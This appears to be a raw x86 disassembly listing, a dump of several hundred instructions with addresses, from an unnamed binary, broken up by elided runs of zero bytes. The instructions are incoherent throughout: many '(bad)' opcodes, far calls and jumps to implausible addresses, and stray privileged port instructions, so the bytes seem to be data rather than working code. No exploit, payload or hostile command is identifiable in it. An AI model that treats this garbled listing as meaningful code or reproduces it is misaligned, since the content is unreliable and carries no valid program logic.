  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0xb9000001,al
  42398d:	add    BYTE PTR [eax-0x63],cl
  423990:	test   ebx,0x4a1e873d
  423996:	mov    WORD PTR [ebx+0x2c],gs
  423999:	mov    eax,DWORD PTR [esi-0x7fd42b73]
  42399f:	(bad)  
  4239a0:	jae    0x423945
  4239a2:	push   esi
  4239a3:	inc    eax
  4239a4:	imul   esi,DWORD PTR [eax+0x7721b610],0x32
  4239ab:	push   cs
  4239ac:	push   esi
  4239ad:	dec    ebp
  4239ae:	xchg   edx,eax
  4239af:	mov    edi,0xb837e1ce
  4239b4:	sub    al,0x8d
  4239b6:	cli    
  4239b7:	inc    ebp
  4239b8:	cmp    BYTE PTR [ecx-0x625d9c81],0x10
  4239bf:	loopne 0x423a0f
  4239c1:	add    esi,DWORD PTR [ebp-0x1fe3da8e]
  4239c7:	aas    
  4239c8:	rol    bh,0x2a
  4239cb:	ret    0x1189
  4239ce:	out    0xb8,eax
  4239d0:	loopne 0x4239a4
  4239d2:	addr16 (bad) 
  4239d4:	dec    ebx
  4239d5:	pop    ecx
  4239d6:	ret    
  4239d7:	xchg   edi,eax
  4239d8:	mov    bl,0x38
  4239da:	fistp  WORD PTR [ebx+0x5b3002c5]
  4239e0:	ds jne 0x4239c3
  4239e3:	outs   dx,DWORD PTR ds:[esi]
  4239e4:	retf   
  4239e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239e6:	bound  ebp,QWORD PTR [ebx+0x43]
  4239e9:	sbb    al,0x5e
  4239eb:	mov    esp,0x544847
  4239f0:	call   0xc27c:0x6194d4b8
  4239f7:	out    dx,eax
  4239f8:	jnp    0x423a65
  4239fa:	retf   
  4239fb:	jno    0x423a03
  4239fd:	xor    bl,BYTE PTR [ebp+edx*2-0x3ce9ed1d]
  423a04:	(bad)  
  423a05:	fbstp  TBYTE PTR [ecx-0x74854efe]
  423a0b:	clc    
  423a0c:	stos   DWORD PTR es:[edi],eax
  423a0d:	mov    edx,DWORD PTR [ebx]
  423a0f:	arpl   WORD PTR [edi+0x8],si
  423a12:	cli    
  423a13:	jmp    0x2a54062d
  423a18:	fwait
  423a19:	push   es
  423a1a:	mov    ch,0x7
  423a1c:	sub    al,0xb0
  423a1e:	ret    0x478b
  423a21:	push   esi
  423a22:	xchg   esp,eax
  423a23:	iret   
  423a24:	jno    0x4239eb
  423a26:	stos   BYTE PTR es:[edi],al
  423a27:	adc    al,0xe8
  423a29:	pusha  
  423a2a:	fprem1 
  423a2c:	and    al,0x53
  423a2e:	sar    ecx,0x35
  423a31:	ds mov bh,0xaa
  423a34:	in     al,0x7e
  423a36:	cmp    al,0xe6
  423a38:	dec    ebx
  423a39:	sbb    al,0x4e
  423a3b:	add    cl,al
  423a3d:	jge    0x4239fe
  423a3f:	jmp    0xdb5d3267
  423a44:	adc    eax,DWORD PTR [eax-0x45eb0aad]
  423a4a:	pop    eax
  423a4b:	or     al,0x96
  423a4d:	rcr    BYTE PTR [ebx],0x87
  423a50:	inc    esi
  423a51:	pop    ecx
  423a52:	sar    DWORD PTR [ecx-0x1fd42f2a],cl
  423a58:	xchg   edi,eax
  423a59:	pop    edx
  423a5a:	jge    0x4239ff
  423a5c:	out    0x68,al
  423a5e:	adc    eax,0x76e6b7a4
  423a63:	dec    eax
  423a64:	push   es
  423a65:	je     0x423a02
  423a67:	sbb    DWORD PTR [edx+ebp*2],ebp
  423a6a:	inc    ebp
  423a6b:	pop    es
  423a6c:	inc    ebx
  423a6d:	mov    cl,0x90
  423a6f:	ret    
  423a70:	sub    cl,bl
  423a72:	dec    edi
  423a73:	xor    eax,0x530c440
  423a78:	into   
  423a79:	cmp    edi,ecx
  423a7b:	pop    ss
  423a7c:	push   0xdadb67ca
  423a81:	and    BYTE PTR [esi+0xf],cl
  423a84:	fucomip st,st(0)
  423a86:	and    esp,DWORD PTR [edi]
  423a88:	dec    ebx
  423a89:	jmp    DWORD PTR [edi+0x70]
  423a8c:	inc    eax
  423a8d:	stos   BYTE PTR es:[edi],al
  423a8e:	into   
  423a8f:	push   ebp
  423a90:	sbb    eax,DWORD PTR [eax]
	...
  423af2:	add    BYTE PTR [eax],al
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	jbe    0x423b2e
  423b02:	cli    
  423b03:	ins    DWORD PTR es:[edi],dx
  423b04:	and    al,0x7d
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    eax,0xdb000001
  423b0d:	fucom  st(6)
  423b0f:	add    dl,BYTE PTR [ebx-0x2c]
  423b12:	and    ah,BYTE PTR [edi-0x1a6da796]
  423b18:	(bad)  
  423b19:	fsub   QWORD PTR [ebx+0x4e]
  423b1c:	clc    
  423b1d:	pop    ds
  423b1e:	test   eax,0xecd17f83
  423b23:	pop    eax
  423b24:	jmp    0x29764656
  423b29:	and    al,cl
  423b2b:	imul   eax,DWORD PTR [ebx-0x3e],0x26
  423b2f:	push   ecx
  423b30:	mov    edi,0xe5c36d48
  423b35:	xchg   BYTE PTR [esp+eax*8+0x7b2476b7],cl
  423b3c:	xchg   al,ah
  423b3e:	fdiv   QWORD PTR [ecx+ebp*2-0x4b65b313]
  423b45:	push   ecx
  423b46:	repnz pop eax
  423b48:	mov    eax,ds:0x89f33409
  423b4d:	jp     0x423b38
  423b4f:	sti    
  423b50:	int3   
  423b51:	inc    eax
  423b52:	sub    DWORD PTR [eax-0x4e],eax
  423b55:	int3   
  423b56:	shl    DWORD PTR [ebx+esi*2+0x247146c],cl
  423b5d:	mov    edi,0x35efaf17
  423b62:	aas    
  423b63:	sbb    eax,DWORD PTR [ecx-0x243b12ce]
  423b69:	iret   
  423b6a:	cmc    
  423b6b:	popa   
  423b6c:	mov    al,0x49
  423b6e:	or     DWORD PTR [edi+0x7a],0xc517ab2d
  423b75:	jl     0x423b74
  423b77:	jo     0x423ba4
  423b79:	cmp    DWORD PTR [esi],ebp
  423b7b:	jecxz  0x423b7e
  423b7d:	mov    gs,WORD PTR ds:0x2d916e27
  423b83:	rcr    BYTE PTR [eax+0x39],1
  423b86:	ins    DWORD PTR es:[edi],dx
  423b87:	pop    eax
  423b88:	sahf   
  423b89:	shl    BYTE PTR [edi],cl
  423b8b:	jbe    0x423bc0
  423b8d:	cmp    DWORD PTR [edx+0x67],esi
  423b90:	out    0x81,al
  423b92:	pop    ss
  423b93:	ds data16 jg 0x423b2f
  423b97:	sbb    DWORD PTR [ebx],ebx
  423b99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b9a:	fdiv   QWORD PTR [ebx]
  423b9c:	sub    dh,BYTE PTR [eax-0x7]
  423b9f:	adc    dl,BYTE PTR [edx+0x3c]
  423ba2:	sub    al,0x53
  423ba4:	sub    bl,dl
  423ba6:	cmp    ebp,edi
  423ba8:	mov    esp,eax
  423baa:	enter  0x3461,0x76
  423bae:	jmp    0x852f:0x92a29b3c
  423bb5:	jecxz  0x423b90
  423bb7:	shl    DWORD PTR [esi+0x49a68801],cl
  423bbd:	cmp    al,0x80
  423bbf:	pop    ds
  423bc0:	sbb    ah,ah
  423bc2:	sti    
  423bc3:	ret    
  423bc4:	dec    edi
  423bc5:	xchg   esi,eax
  423bc6:	stos   BYTE PTR es:[edi],al
  423bc7:	push   0x5d
  423bc9:	pop    esi
  423bca:	into   
  423bcb:	jbe    0x423c0e
  423bcd:	cmp    DWORD PTR [esp+ebp*2],ebp
  423bd0:	or     DWORD PTR [esi-0xd],0xbb391927
  423bd7:	mov    ds:0x17d139f8,eax
  423bdc:	imul   ecx,DWORD PTR [edi],0xf265f488
  423be2:	xchg   ebx,eax
  423be3:	addr16 (bad) 
  423be5:	cmp    BYTE PTR es:[edi+0x6e],dl
  423be9:	pop    ecx
  423beb:	mov    esi,0xa8e1b887
  423bf0:	retf   0x95a3
  423bf3:	popf   
  423bf4:	add    dl,BYTE PTR [ebx+0x2d]
  423bf7:	mov    al,ds:0x678f912d
  423bfc:	(bad)  
  423bfe:	pop    ebx
  423bff:	sub    al,0xe0
  423c01:	dec    ecx
  423c02:	adc    edi,DWORD PTR [ecx-0x15]
  423c05:	fucomip st,st(5)
  423c07:	mov    eax,ds:0x945e4ab2
  423c0c:	das    
  423c0d:	pop    ss
  423c0e:	cmp    eax,0x719f
	...
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x42446617]
  423c81:	adc    edi,DWORD PTR [edi+0x17e2963]
  423c87:	add    BYTE PTR ds:0xae000001,al
  423c8d:	sbb    esp,DWORD PTR [edx-0x43]
  423c90:	fld    st(7)
  423c92:	hlt    
  423c93:	adc    bl,BYTE PTR [ecx+0x723a34d4]
  423c99:	mov    ds:0x565e908f,al
  423c9e:	lock inc edx
  423ca0:	ja     0x423c80
  423ca2:	lock int 0x14
  423ca5:	cmp    BYTE PTR [edi+0x4ae0246d],al
  423cab:	nop
  423cac:	xchg   esi,eax
  423cad:	icebp  
  423cae:	not    BYTE PTR [eax]
  423cb0:	ror    BYTE PTR [edi],1
  423cb2:	jmp    0x423d16
  423cb4:	adc    al,0x54
  423cb6:	mov    ecx,0xc1d71bde
  423cbb:	ret    
  423cbc:	xchg   edx,eax
  423cbd:	add    al,0xa0
  423cbf:	and    ah,BYTE PTR [eax+0x51545ef7]
  423cc5:	or     eax,0x2eaa9149
  423cca:	mov    dh,0x98
  423ccc:	dec    esp
  423ccd:	and    ah,0xfb
  423cd0:	popa   
  423cd1:	leave  
  423cd2:	mov    al,0x34
  423cd4:	imul   edi,DWORD PTR [edi+0x4fff4322],0xda884d5
  423cde:	xchg   DWORD PTR [esi],esp
  423ce0:	xchg   ecx,eax
  423ce1:	push   ebp
  423ce2:	push   esi
  423ce3:	inc    eax
  423ce4:	pop    edx
  423ce5:	std    
  423ce6:	stos   BYTE PTR es:[edi],al
  423ce7:	xor    DWORD PTR [edi-0x6a9fd61a],0x8ee496b4
  423cf1:	sbb    al,dl
  423cf3:	sub    al,0x9c
  423cf5:	loop   0x423d5e
  423cf7:	sbb    eax,0x8b01728c
  423cfc:	dec    esp
  423cfd:	mov    ch,0x4c
  423cff:	or     dl,ah
  423d01:	js     0x423d4d
  423d03:	mov    eax,ds:0x785d0903
  423d08:	test   dl,0xa1
  423d0b:	jo     0x423d03
  423d0d:	adc    al,0x29
  423d0f:	mov    ah,0xfe
  423d11:	jg     0x423cf7
  423d13:	(bad)  
  423d14:	xchg   esi,eax
  423d15:	sbb    eax,0xd9b7b9a1
  423d1a:	adc    eax,0xd18d7977
  423d1f:	push   esi
  423d20:	pop    ecx
  423d21:	aam    0xdd
  423d23:	inc    esp
  423d24:	inc    ebp
  423d25:	mov    ds:0xc71ec0fe,eax
  423d2a:	test   al,0x2c
  423d2c:	es pop ds
  423d2e:	push   eax
  423d2f:	cli    
  423d30:	call   0x83db:0x1a633885
  423d37:	retf   0x2ce
  423d3a:	jo     0x423cef
  423d3c:	jmp    0xad570d27
  423d41:	push   ebx
  423d42:	(bad)  
  423d44:	in     eax,dx
  423d45:	sti    
  423d46:	leave  
  423d47:	pusha  
  423d48:	jmp    0x233d1bd0
  423d4d:	push   esp
  423d4e:	jg     0x423d0a
  423d50:	xor    DWORD PTR [esi+ebp*8-0x2b243f24],ecx
  423d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d58:	in     al,dx
  423d59:	push   ss
  423d5a:	adc    al,0xa5
  423d5c:	mov    eax,0xbd9aa33e
  423d61:	push   eax
  423d62:	jbe    0x423d6a
  423d64:	sub    al,0x35
  423d66:	cld    
  423d67:	jns    0x423d59
  423d69:	push   edi
  423d6a:	mov    ch,ch
  423d6c:	inc    edi
  423d6d:	jg     0x423d36
  423d6f:	aaa    
  423d70:	aam    0x47
  423d72:	clc    
  423d73:	mov    WORD PTR [ebx+0x1996b912],?
  423d79:	adc    al,0xa6
  423d7b:	xchg   esi,eax
  423d7c:	push   esi
  423d7d:	xchg   edi,eax
  423d7e:	cmp    al,0x5e
  423d80:	loope  0x423ddf
  423d82:	sti    
  423d83:	xchg   ebp,eax
  423d84:	ret    
  423d85:	mov    ecx,0x691ec557
  423d8a:	pop    ds
  423d8b:	xchg   edx,eax
  423d8c:	fadd   DWORD PTR [esi+edx*4+0x10]
  423d90:	in     eax,dx
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax-0x5f3e802e],esp
  423e03:	stc    
  423e04:	cs jg  0x423e08
  423e07:	add    BYTE PTR ds:0xef000001,al
  423e0d:	sahf   
  423e0e:	and    ah,BYTE PTR [ecx-0x65]
  423e11:	clc    
  423e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e13:	mov    WORD PTR [esi-0x18],ds
  423e16:	pop    esp
  423e17:	cmc    
  423e18:	mov    ebp,0x4e0a96ad
  423e1d:	mov    edx,0x8d108dcc
  423e22:	(bad)  
  423e24:	mov    ds:0x9d89d6c5,al
  423e29:	pop    esp
  423e2a:	repnz loop 0x423e13
  423e2d:	push   edx
  423e2e:	shr    DWORD PTR [ecx+0x67aebd0f],0x77
  423e35:	mov    edx,0x787ab17a
  423e3a:	push   cs
  423e3b:	sbb    bh,cl
  423e3d:	xor    ecx,DWORD PTR [ecx]
  423e3f:	and    esp,DWORD PTR [esi+0x39]
  423e42:	addr16 add al,0x61
  423e45:	xor    BYTE PTR [eax-0x77],0x9b
  423e49:	outs   dx,BYTE PTR ds:[esi]
  423e4a:	mov    ds:0xc1f3a1df,eax
  423e4f:	test   al,0x9b
  423e51:	jbe    0x423dd4
  423e53:	push   0xfad7e949
  423e58:	xchg   DWORD PTR [ecx-0x1f10cb07],edi
  423e5e:	or     al,ah
  423e60:	nop
  423e61:	mov    eax,0x1a614620
  423e66:	cmp    eax,0x205e7ca1
  423e6b:	adc    eax,0x9117cf4b
  423e70:	aaa    
  423e71:	mov    al,0xf1
  423e73:	shl    DWORD PTR [edi],0x8
  423e76:	repnz push ebp
  423e78:	xlat   BYTE PTR ds:[ebx]
  423e79:	sahf   
  423e7a:	lock and eax,0xc0745f9b
  423e80:	adc    edi,DWORD PTR es:[eax]
  423e83:	nop
  423e84:	out    0x76,al
  423e86:	mov    dl,0xbb
  423e88:	push   0x3f
  423e8a:	sub    eax,0x5fa2cf56
  423e8f:	sbb    ch,BYTE PTR ds:0xa9574d2a
  423e95:	cmp    al,0x97
  423e97:	test   BYTE PTR [edi-0xa20f438],cl
  423e9d:	sbb    DWORD PTR [edx],edi
  423e9f:	pop    DWORD PTR [edi+0x164578ac]
  423ea5:	cmp    ch,BYTE PTR [eax-0x7c761d3f]
  423eab:	popf   
  423eac:	jnp    0x423e6c
  423eae:	test   eax,0xcb134f05
  423eb3:	jp     0x423e57
  423eb5:	and    al,0x3f
  423eb7:	test   DWORD PTR [ebp+0x6b0d5594],ebx
  423ebd:	xor    ecx,esi
  423ebf:	jo     0x423e84
  423ec1:	jo     0x423ec6
  423ec3:	push   es
  423ec4:	vcvtss2sd xmm3,xmm0,DWORD PTR [eax+0xf36c69a]
  423ecc:	jne    0x423ee9
  423ece:	cmp    DWORD PTR [edi-0x4b694dd7],ebp
  423ed4:	in     al,dx
  423ed5:	sbb    BYTE PTR [ebx-0xf],dl
  423ed8:	xchg   BYTE PTR [edx],dl
  423eda:	retf   0x2271
  423edd:	clc    
  423ede:	sub    ebp,eax
  423ee0:	leave  
  423ee1:	pop    es
  423ee2:	das    
  423ee3:	mov    ds:0x8573e10f,al
  423ee8:	pop    ss
  423ee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423eea:	xor    dh,ch
  423eec:	shl    DWORD PTR [esi-0x659d7df9],0x98
  423ef3:	cmp    DWORD PTR [ebp+0x1c],ebp
  423ef6:	fisubr WORD PTR [ebp-0x50]
  423ef9:	and    ch,BYTE PTR [ebx-0x66a23a3e]
  423eff:	xchg   ebp,eax
  423f00:	or     DWORD PTR [ecx+0x16b0fc95],esi
  423f06:	pop    ds
  423f07:	pop    ebx
  423f08:	add    eax,0x7385b108
  423f0d:	pop    ecx
  423f0e:	ror    DWORD PTR [esp+ebp*2],0x0
	...
  423f72:	add    BYTE PTR [eax],al
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	arpl   WORD PTR [ebx],dx
  423f82:	mov    bh,0x2b
  423f84:	xor    eax,DWORD PTR [eax+0x1050001]
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	out    0x66,eax
  423f8e:	xchg   edx,eax
  423f8f:	cmp    bl,0x7b
  423f92:	mov    BYTE PTR [eax-0x303d972b],cl
  423f98:	jno    0x423fc3
  423f9a:	fcmovnb st,st(5)
  423f9c:	stos   BYTE PTR es:[edi],al
  423f9d:	rcl    BYTE PTR [bx+si+0xf45],cl
  423fa2:	cmp    al,0x66
  423fa4:	imul   edi,edi,0xcbee991
  423faa:	adc    dl,BYTE PTR [edi+0x0]
  423fad:	dec    ebx
  423fae:	pusha  
  423faf:	jo     0x423fb6
  423fb1:	xchg   ebp,eax
  423fb2:	(bad)  
  423fb3:	lods   al,BYTE PTR ds:[esi]
  423fb4:	cs fwait
  423fb6:	(bad)  
  423fb7:	add    DWORD PTR [ebp-0x37],eax
  423fba:	xchg   edx,eax
  423fbb:	jmp    0x6c7ca8fa
  423fc0:	sbb    al,0x31
  423fc2:	ins    DWORD PTR es:[edi],dx
  423fc3:	jae    0x423f95
  423fc5:	pop    es
  423fc6:	cmp    DWORD PTR [ebp-0x6f],eax
  423fc9:	sbb    al,0x85
  423fcb:	cdq    
  423fcc:	sti    
  423fcd:	ret    0xfd99
  423fd0:	out    dx,eax
  423fd1:	and    DWORD PTR [ecx+0x5d27bd5d],0x40fbd9f
  423fdb:	and    ebp,DWORD PTR [eax-0x364f2114]
  423fe1:	xchg   esi,eax
  423fe2:	repz fild DWORD PTR [edx-0x300303d7]
  423fe9:	ja     0x424063
  423feb:	lgs    ebx,FWORD PTR [eax]
  423fee:	sbb    DWORD PTR [ebx+0x51010423],ecx
  423ff4:	fimul  WORD PTR [eax+0x6fbbb15e]
  423ffa:	push   edi
  423ffb:	sub    eax,0xff038144
  424000:	jae    0x423ff5
  424002:	sub    eax,0xbca76789
  424007:	lods   eax,DWORD PTR ds:[esi]
  424008:	std    
  424009:	test   BYTE PTR [edi+edi*1],cl
  42400c:	enter  0x4ab7,0x87
  424010:	dec    eax
  424011:	gs loopne 0x424041
  424014:	jmp    0x53e99d8c
  424019:	gs pop esp
  42401b:	cdq    
  42401c:	das    
  42401d:	int    0xd4
  42401f:	mov    esi,0xcbccefad
  424024:	pop    edx
  424025:	arpl   WORD PTR [ecx],ax
  424027:	lods   eax,DWORD PTR ds:[esi]
  424028:	frstor [ebp-0x6e6f022d]
  42402e:	push   0xac338b55
  424033:	mov    ebp,0xba6debc8
  424038:	mov    ebx,0x5a7d345d
  42403d:	bound  ecx,QWORD PTR [esi+ebx*1+0x1c]
  424041:	lods   al,BYTE PTR ds:[esi]
  424042:	js     0x423ff3
  424044:	ret    
  424045:	cmp    BYTE PTR [ebx+0x8f980e4],bh
  42404b:	add    ecx,DWORD PTR [esp+esi*4+0x36a3c0e5]
  424052:	xchg   edx,eax
  424053:	sbb    eax,0xd0b91951
  424058:	lods   eax,DWORD PTR ds:[esi]
  42405a:	arpl   WORD PTR [ecx+0x32],ax
  42405d:	repz ds out dx,eax
  424060:	cmp    BYTE PTR [edx-0x69a7051c],cl
  424066:	push   esi
  424067:	gs inc eax
  424069:	aam    0xcf
  42406b:	inc    eax
  42406c:	xor    eax,0xd143cc6b
  424071:	pop    edi
  424072:	out    0xf0,al
  424074:	xlat   BYTE PTR ds:[ebx]
  424075:	jp     0x424014
  424077:	or     ch,BYTE PTR [esi-0x1f2fa887]
  42407d:	mov    WORD PTR [eax-0x1c99721f],?
  424083:	(bad)  
  424084:	pop    ebp
  424085:	(bad)  
  424086:	fldcw  WORD PTR [edi-0x60]
  424089:	sub    al,0x33
  42408b:	out    dx,al
  42408c:	int    0xc4
  42408e:	inc    edi
  42408f:	das    
  424090:	rol    DWORD PTR [eax],cl
	...
  4240f2:	add    BYTE PTR [eax],al
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	popa   
  424101:	aam    0xd7
  424103:	dec    esi
  424104:	cmp    BYTE PTR [ecx+0x1050001],al
  42410a:	add    BYTE PTR [eax],al
  42410c:	call   FWORD PTR [esi+0x57]
  42410f:	lea    ebp,[eax]
  424111:	(bad)  
  424112:	fisubr DWORD PTR [eax]
  424114:	fwait
  424115:	mov    al,ds:0xa0115f77
  42411a:	push   esi
  42411b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42411c:	retf   
  42411d:	xlat   BYTE PTR ds:[ebx]
  42411e:	les    esp,FWORD PTR [eax-0x5e2a6c2f]
  424124:	in     eax,0x57
  424126:	xlat   BYTE PTR ds:[ebx]
  424127:	jne    0x424119
  424129:	cmc    
  42412a:	mov    bl,0x5c
  42412c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42412d:	xchg   ebx,eax
  42412e:	adc    BYTE PTR ds:0xe682a519,dl
  424134:	jle    0x4240cd
  424136:	sbb    BYTE PTR [ebx+0x6ba0347b],dl
  42413c:	pop    esp
  42413d:	mov    dh,0xa8
  42413f:	lahf   
  424140:	sbb    DWORD PTR [ebp+ebx*8-0x6],ecx
  424144:	push   cs
  424145:	mov    eax,0x5cb7976
  42414a:	xor    DWORD PTR [edi],ebx
  42414c:	sub    cl,bh
  42414e:	ja     0x42417d
  424150:	(bad)  
  424151:	pop    eax
  424152:	pop    ss
  424153:	push   0xf
  424155:	ffreep st(7)
  424157:	or     ch,ch
  424159:	dec    esi
  42415a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42415b:	adc    ebp,ebp
  42415d:	and    eax,0x8dfc4114
  424162:	aas    
  424163:	in     eax,0x1f
  424165:	test   DWORD PTR [ecx+0x4d],ebp
  424168:	inc    ebp
  424169:	cld    
  42416a:	into   
  42416b:	sbb    al,0xda
  42416d:	daa    
  42416e:	adc    eax,0x5bf89733
  424173:	adc    eax,0x6a9232aa
  424178:	outs   dx,BYTE PTR ds:[esi]
  424179:	outs   dx,BYTE PTR ds:[esi]
  42417a:	pop    esp
  42417b:	into   
  42417c:	or     eax,0xddb0b45f
  424181:	push   edx
  424182:	jns    0x4241b0
  424184:	mov    ecx,0xd8da060
  424189:	adc    BYTE PTR [eax+ebp*8],cl
  42418c:	neg    DWORD PTR [edx+0x36]
  42418f:	mov    bh,0x8c
  424191:	pop    edx
  424192:	push   esp
  424193:	fmul   st(4),st
  424195:	loope  0x424155
  424197:	lock adc BYTE PTR [ebx],ah
  42419a:	out    0x0,eax
  42419c:	rol    eax,1
  42419e:	ins    BYTE PTR es:[edi],dx
  42419f:	pop    es
  4241a0:	add    DWORD PTR [edx+0x6f396219],0x24
  4241a7:	xchg   esp,eax
  4241a8:	scas   eax,DWORD PTR es:[edi]
  4241a9:	mov    eax,ds:0xf0b7a711
  4241ae:	push   es
  4241af:	popa   
  4241b0:	add    DWORD PTR [edi],ebp
  4241b2:	out    dx,eax
  4241b3:	clc    
  4241b4:	repz mov ebx,esp
  4241b7:	test   esp,ebx
  4241b9:	cwde   
  4241ba:	lock push eax
  4241bc:	daa    
  4241bd:	add    eax,0x1ca79ead
  4241c2:	sub    edi,esi
  4241c4:	mov    al,ds:0x46052f85
  4241c9:	jle    0x42421a
  4241cb:	jmp    0xcd7a7de1
  4241d0:	pop    ecx
  4241d1:	(bad)
  4241d4:	outs   dx,BYTE PTR ds:[esi]
  4241d5:	cdq    
  4241d6:	xchg   esp,eax
  4241d7:	in     al,dx
  4241d8:	mov    ds:0xf5cf17bb,eax
  4241dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241de:	lock icebp 
  4241e0:	sbb    DWORD PTR [edx+0xc],eax
  4241e3:	adc    cl,bl
  4241e5:	enter  0xcec4,0x89
  4241e9:	jge    0x4241fe
  4241eb:	or     DWORD PTR [eax],ecx
  4241ed:	sbb    al,0x9c
  4241ef:	pop    es
  4241f0:	push   edi
  4241f1:	mov    bh,0xc8
  4241f3:	jle    0x4241a2
  4241f5:	cmp    cl,ah
  4241f7:	div    DWORD PTR [ebx+ebx*8]
  4241fa:	lods   eax,DWORD PTR ds:[esi]
  4241fb:	adc    al,0x5
  4241fd:	add    eax,0x16e5705f
  424202:	jae    0x4241f3
  424204:	jae    0x4241cf
  424206:	xchg   edi,eax
  424207:	je     0x4241f0
  424209:	fs (bad) 
  42420b:	cmc    
  42420c:	outs   dx,BYTE PTR ds:[esi]
  42420d:	inc    ecx
  42420e:	xchg   edi,eax
  42420f:	ins    DWORD PTR es:[edi],dx
  424210:	cmc    
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	lds    esi,FWORD PTR [edi-0x7dc27c32]
  424286:	add    DWORD PTR [eax],eax
  424288:	add    eax,0x94000001
  42428d:	mov    DWORD PTR [edi*4-0x4e8c9859],edx
  424294:	pushf  
  424295:	mov    eax,ds:0x1b36b467
  42429a:	test   al,0x3e
  42429c:	jne    0x4242e7
  42429e:	mov    ah,0x5e
  4242a0:	imul   eax,DWORD PTR [ecx+0x512da5d1],0x3b
  4242a7:	or     al,0xd2
  4242a9:	sahf   
  4242aa:	xchg   BYTE PTR [ebx+0x46],ah
  4242ad:	dec    ebx
  4242ae:	mov    al,0x40
  4242b0:	in     al,0xe0
  4242b2:	xor    eax,0x221d9378
  4242b7:	add    DWORD PTR [edx+eiz*4-0x76f9f06a],0x62
  4242bf:	adc    cl,BYTE PTR [eax+0x5b]
  4242c2:	jo     0x4242cb
  4242c4:	int3   
  4242c5:	out    0xcf,al
  4242c7:	and    edi,DWORD PTR [eax-0x28]
  4242ca:	mov    gs,WORD PTR [eax+0x4c]
  4242cd:	ins    BYTE PTR es:[edi],dx
  4242ce:	ret    
  4242cf:	lds    ebp,FWORD PTR [ecx-0x7f6a6384]
  4242d5:	cmp    al,0x4c
  4242d7:	push   ebx
  4242d8:	cmp    al,0xf9
  4242da:	fdivr  DWORD PTR [edx-0x36]
  4242dd:	push   ecx
  4242de:	pop    ss
  4242df:	jns    0x424352
  4242e1:	push   eax
  4242e2:	stos   BYTE PTR es:[edi],al
  4242e3:	cmp    edx,DWORD PTR [eax+0x331c4fab]
  4242e9:	cdq    
  4242ea:	js     0x424361
  4242ec:	mov    eax,0xe8dcccc2
  4242f1:	sbb    edx,edx
  4242f3:	in     al,dx
  4242f4:	jae    0x424354
  4242f6:	test   BYTE PTR [eax-0x3a3413c7],al
  4242fc:	push   esp
  4242fd:	dec    edx
  4242fe:	test   BYTE PTR [ebx+0x6a],dh
  424301:	fs inc esp
  424303:	ret    0xe726
  424306:	mov    bh,0x26
  424308:	add    ch,BYTE PTR es:[edi]
  42430b:	push   ecx
  42430c:	sbb    BYTE PTR [ecx],cl
  42430e:	icebp  
  42430f:	ja     0x4242e6
  424311:	les    eax,FWORD PTR [ebx-0x4c568b93]
  424317:	fwait
  424318:	jns    0x42431e
  42431a:	mov    ds:0x70853112,al
  42431f:	inc    ecx
  424320:	push   ds
  424321:	xchg   esi,eax
  424322:	(bad)  [ebx+0x9c65370]
  424328:	ret    0x20e0
  42432b:	ret    0x9699
  42432e:	mov    edx,0x65af106a
  424333:	jecxz  0x424371
  424335:	mov    ch,0xd2
  424337:	push   edx
  424338:	icebp  
  424339:	lds    esp,FWORD PTR [edi]
  42433b:	sbb    al,BYTE PTR [ebp+edi*2+0x8]
  42433f:	or     ch,al
  424341:	sar    DWORD PTR [ecx+edi*8-0x3ba9b327],cl
  424348:	aad    0x9b
  42434a:	inc    edi
  42434b:	inc    eax
  42434c:	cld    
  42434d:	jbe    0x424343
  42434f:	lods   al,BYTE PTR ds:[esi]
  424350:	ins    BYTE PTR es:[edi],dx
  424351:	iret   
  424352:	adc    BYTE PTR [edi-0x33],dh
  424355:	xor    ah,dh
  424357:	fnsave [eax+0x2922741]
  42435d:	ret    
  42435e:	es mov edx,0xdca6d7d9
  424364:	ds call 0x28b7:0xcceead65
  42436c:	pop    eax
  42436d:	add    eax,0x40d93853
  424372:	outs   dx,DWORD PTR ds:[esi]
  424373:	xchg   esi,eax
  424374:	cwde   
  424375:	jp     0x4242fa
  424377:	push   edi
  424378:	retf   0xb9b8
  42437b:	aas    
  42437c:	push   edi
  42437d:	scas   al,BYTE PTR es:[edi]
  42437e:	cwde   
  42437f:	xchg   ebp,eax
  424380:	leave  
  424381:	pop    esi
  424382:	aam    0xa6
  424384:	jmp    0x3d9:0x53c31e57
  42438b:	icebp  
  42438c:	cmp    al,0xae
  42438e:	(bad)  
  42438f:	sbb    eax,0xb0
	...
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x4243d1
  424401:	aam    0x54
  424403:	mov    BYTE PTR [edx-0x7d],al
  424406:	add    DWORD PTR [eax],eax
